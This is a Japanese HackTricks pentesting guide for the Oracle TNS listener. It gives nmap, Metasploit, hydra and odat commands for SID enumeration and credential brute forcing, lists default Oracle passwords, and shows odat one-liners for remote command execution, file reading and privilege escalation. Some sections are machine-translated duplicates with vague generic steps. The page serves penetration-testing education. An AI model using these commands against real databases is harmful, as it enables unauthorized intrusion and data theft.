# 1521,1522-1529 - Oracle TNSリスナーのペントesting

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## 基本情報

Oracleデータベース（Oracle DB）は、Oracle Corporationからの関係データベース管理システム（RDBMS）です（[ここから](https://www.techopedia.com/definition/8711/oracle-database)）。

Oracleを列挙する際の最初のステップは、通常デフォルトポート（1521/TCP）に存在するTNSリスナーと通信することです（1522-1529にもセカンダリリスナーが存在する場合があります）。
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## 概要

1. **バージョン情報を列挙**する（既知の脆弱性を検索する）
2. TNSリスナーの通信を**ブルートフォース**する（必ずしも必要ではない）
3. **SID名**（データベース名のようなもの）を列挙/ブルートフォースする
4. 発見した有効なSID名のために**資格情報をブルートフォース**する
5. コードの**実行を試みる**

MSFオラクルモジュールを使用するためには、いくつかの依存関係をインストールする必要があります：[**インストール**](oracle-pentesting-requirements-installation.md)

## 列挙

これに使用できるツールは、nmap、MSF、および[tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip)です。

### TNSリスナーバージョン
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
他の便利なTNSリスナーコマンド：

| **コマンド**  | **目的**                                                     |
| ------------ | --------------------------------------------------------------- |
| ping         | リスナーにPingを送信する                                               |
| version      | リスナーバージョンとプラットフォーム情報を提供する |
| status       | リスナーが使用する現在のステータスと変数を返す    |
| services     | サービスデータをダンプする                                               |
| debug        | デバッグ情報をリスナーログにダンプする                  |
| reload       | リスナーの設定ファイルを再読み込みする                          |
| save\_config | リスナーの設定ファイルをバックアップ場所に書き込む      |
| stop         | リスナーシャットダウンを実行する                                        |

もし**エラーが発生した**場合、TNSのバージョンが**互換性がない**可能性があります（`tnscmd10`と`--10G`パラメータを使用してください）。そして、もし**エラーが続く**場合、リスナーは**パスワードで保護されている**可能性があります（[**ここに詳細なエラーのリストがあります**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)）-心配しないで... hydraが助けになります。
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
TNSリスナーは**MitM**攻撃の脆弱性がある可能性があります。[サーバーが脆弱かどうかを確認し、攻撃を実行する方法についてはこちらを参照してください（バージョン12cまでのすべてのバージョンに対応）](tns-poison.md)。

### SIDの列挙

#### **SIDとは何ですか**

SID（サービス識別子）は基本的にはデータベース名です。インストールによっては、1つ以上のデフォルトのSIDや、完全にカスタムのdba定義されたSIDがある場合もあります。

**一部の古いバージョン（9では動作します）では、SIDを要求し、データベースがそれを送信することができます。**
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
**SIDブルートフォース**

もしもこの方法でSIDにアクセスできない場合は、ブルートフォース攻撃が必要です。

私はnmapとMSFのSIDリストを統合し、重複を排除したものを以下に示します：

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
**oracle_login**を**patator**と一緒に使用するためには、以下の手順で**インストール**する必要があります:
```
pip3 install cx_Oracle --upgrade
```
## **アカウントのターゲティング**

**SIDを手に入れましたか？** それなら、次のタスクに進んでユーザーアカウント情報を抽出しましょう。この段階から、リスナーに接続して資格情報をブルートフォース攻撃することができます。

**Metasploit** _\*\*scanner/oracle/oracle\_login_ には、ログイン:パスワードとして表示される**最も一般的なデフォルト値の辞書**が組み込まれています。ちなみに、このようなデフォルトのエントリは、Oracleにおける最も一般的で深刻なセキュリティの問題の1つを表しています。

**Nmap** は、_oracle-brute_ スクリプトで助けを提供することもできます。このスクリプトは、ログインとパスワードを**混在させて**、つまり、各ログインをすべてのパスワードに対して試すため、かなり時間がかかります！

### **デフォルトのパスワード**

以下は、Oracleに関連付けられたいくつかのデフォルトのパスワードです：

* **DBSNMP/DBSNMP** — インテリジェントエージェントがデータベースサーバーと通信するために使用する（変更するのには手間がかかる）
* **SYS/CHANGE\_ON\_INSTALL** — Oracle v9以前のデフォルトのsysdbaアカウントで、バージョン10g以降では異なる必要があります！
* **PCMS\_SYS/PCMS\_SYS** — デフォルトのxアカウント
* **WMSYS/WMSYS** — デフォルトのxアカウント
* **OUTLN/OUTLN** — デフォルトのxアカウント
* **SCOTT/TIGER** — デフォルトのxアカウント

他の**デフォルトのパスワード**は、[こちら](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm)と[こちら](https://cirt.net/passwords?vendor=Oracle)で見つけることができます。

バージョン11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2、および11.2.0.3は、**オフラインブルートフォース攻撃**の脆弱性があります。[**このテクニックについての詳細はこちらを参照してください。**](remote-stealth-pass-brute-force.md)

### ユーザー/パスワードのブルートフォース攻撃

Oracleに対して、異なるツールが提供する**異なるユーザー/パスワードリスト**があります：

* **oscan:** _/usr/share/oscanner/accounts.default_（169行）
* **MSF-1:** _from_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv（598行）
* **MSF-2:** _from scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_（568行）
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_（687行）

これらをすべて**混在させ、重複を削除しました**：

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [ブルートフォース攻撃](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

さて、**有効なSIDと有効な資格情報**がわかったので、データベースに接続するためにはツール：_**sqlplus**_が必要です。インストールするには、以下の手順に従う必要があります：

[インストール](oracle-pentesting-requirements-installation.md)

既知の資格情報を使用してログインするには：
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
もしTNSリスナーがデフォルトのポートではない場合（例：TCP/1522）：
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
もし**アカウントがシステムデータベースの特権（sysdba）またはシステムオペレータ（sysop）**を持っている場合、以下の方法を試してみることができます。
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **オールインワン**

**興味深いツールはoscannerです**。このツールは、有効なSIDを取得しようとし、有効な資格情報をブルートフォース攻撃して抽出しようとします。以下のコマンドを使用してoscannerを実行します。
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
もう一つのツールは、[**odat**](https://github.com/quentinhardy/odat)です。これはすべてのことを行うことができます。
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
これらのオプション（_-s_ と _-p_）を使用すると、ODATは最初のステップで有効なSID（システムID）を検索します。構成方法（ワードリストまたはブルートフォース攻撃など）のいくつかのオプションを設定することができます。デフォルトでは、ODATは大きなワードリストを使用し、小さなブルートフォース攻撃を行います。

ODATが少なくとも1つのSID（例：_ORCL_）を見つけた場合、有効なOracleアカウントを検索します。それは**見つかった各SID**で行います。資格情報のためにいくつかのオプションを指定することができます（例：_--accounts-file_、_--accounts-files_、_--login-as-pwd_）。

**各有効なアカウント**（例：_SYS_）**の各有効なインスタンス**（SID）に対して、ODATは**各Oracleユーザーができること**（例：リバースシェル、ファイルの読み取り、DBAへの昇格）を返します。

[**Wiki odat**](https://github.com/quentinhardy/odat/wiki)

## リモートコード実行

JavaプロシージャとDBMS\_SCHEDULERパッケージを使用してコマンドを実行するための少なくとも2つの異なる方法があります。ちなみに、ウェブアプリケーションのSQLインジェクションの場合も、実行しているユーザーに十分な権限がある場合にはRCEを達成することができます。この段階では、Oracle Database Attacking Tool（ODAT）の準備を強くお勧めします：[ODAT](https://github.com/quentinhardy/odat)。

### ODATのインストール
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### Javaストアドプロシージャを使用してコードを実行する

In some cases, an Oracle Listener may have a Java Stored Procedure enabled, which can be exploited to execute arbitrary code. This technique can be used during a penetration test to gain unauthorized access to the Oracle Listener.

以下の場合、OracleリスナーにはJavaストアドプロシージャが有効になっている場合があります。これを悪用して任意のコードを実行することができます。このテクニックは、ペネトレーションテスト中にOracleリスナーへの不正アクセスを行うために使用することができます。

To execute code via a Java Stored Procedure, follow these steps:

Javaストアドプロシージャを使用してコードを実行するには、以下の手順に従ってください。

1. Identify the Java Stored Procedure: First, you need to identify if the Oracle Listener has a Java Stored Procedure enabled. This can be done by querying the `DBA_OBJECTS` table and looking for objects with the type `JAVA SOURCE` or `JAVA CLASS`.

   Javaストアドプロシージャを特定する：まず、OracleリスナーにJavaストアドプロシージャが有効になっているかどうかを特定する必要があります。これは、`DBA_OBJECTS`テーブルをクエリし、タイプが`JAVA SOURCE`または`JAVA CLASS`のオブジェクトを探すことで行うことができます。

2. Analyze the Java Stored Procedure: Once you have identified the Java Stored Procedure, analyze its code to understand its functionality and potential vulnerabilities. Look for any user input that is not properly validated or sanitized.

   Javaストアドプロシージャを分析する：Javaストアドプロシージャを特定したら、そのコードを分析して機能と潜在的な脆弱性を理解します。適切に検証またはサニタイズされていないユーザー入力を探してください。

3. Craft the payload: Based on the analysis, craft a payload that exploits the vulnerability in the Java Stored Procedure. This payload should allow you to execute arbitrary code on the Oracle Listener.

   ペイロードの作成：分析に基づいて、Javaストアドプロシージャの脆弱性を悪用するペイロードを作成します。このペイロードにより、Oracleリスナー上で任意のコードを実行できるようにする必要があります。

4. Execute the payload: Finally, execute the crafted payload to exploit the vulnerability and execute your desired code on the Oracle Listener.

   ペイロードの実行：最後に、作成したペイロードを実行して脆弱性を悪用し、Oracleリスナー上で目的のコードを実行します。

It is important to note that exploiting a Java Stored Procedure requires a deep understanding of Java programming and Oracle Listener internals. Additionally, this technique should only be used in controlled environments with proper authorization, such as during a penetration test.
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
### スケジューラを介してコードを実行する

The Oracle Scheduler is a powerful tool that allows you to schedule and automate tasks within the Oracle database. However, it can also be exploited by hackers to execute malicious code.

To execute code via the Scheduler, you can follow these steps:

1. Identify the target database's version and configuration.
2. Enumerate the available jobs and schedules using the `DBA_SCHEDULER_JOBS` and `DBA_SCHEDULER_SCHEDULES` views.
3. Look for any jobs or schedules that have elevated privileges or execute code in a privileged context.
4. Analyze the job's code and parameters to understand its functionality and potential vulnerabilities.
5. Craft a payload that exploits the identified vulnerability.
6. Submit the payload as a job or modify an existing job to execute the payload.
7. Monitor the execution of the job and collect any output or results.

By exploiting the Oracle Scheduler, an attacker can gain unauthorized access to the database, execute arbitrary code, or perform other malicious actions. It is crucial for administrators to regularly review and secure the Scheduler to prevent such attacks.
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
[詳細はこちら](oracle-rce-and-more.md#rce-scheduler)

### 外部テーブルを介してコードを実行する
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
‘ODAT.py’は特権「CREATE ANY DIRECTORY」を必要とします。デフォルトでは、この特権はDBAロールにのみ付与されているため、任意のディレクトリからファイルを実行しようとします（この攻撃の手動バージョンはより少ない特権を必要とします）。

[詳細はこちらを参照してください。](oracle-rce-and-more.md#rce-external-tables)

## ファイルの読み書き
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[詳細はこちら](oracle-rce-and-more.md#read-write-files)

## 特権の昇格

[詳細はこちら](oracle-rce-and-more.md#elevating-privileges)

odatの[privesc](https://github.com/quentinhardy/odat/wiki/privesc)モジュールを使用して特権を昇格させることができます。そのリンクには、odatを使用して特権を昇格させる**いくつかの方法**が記載されています。
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
Oracle 10.1.0.3.0でテストされた脆弱性 - 10.1.0.5.0および11gで動作するはずです。Oracle Critical Patch Update October 2007で修正されました。
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## テスト用の無料仮想環境

Oracleデータベースの攻撃を練習したい場合、最も安全な方法はOracle Developer Days Virtualbox VMに登録することです。

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

この投稿のほとんどの情報は、以下から抽出されました：[https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) および [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

他の興味深い**参考文献**：

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## HackTricks 自動コマンド
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for Oracle
Note: |
Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

#great oracle enumeration tool
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki

https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
Name: Nmap
Description: Nmap with Oracle Scripts
Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
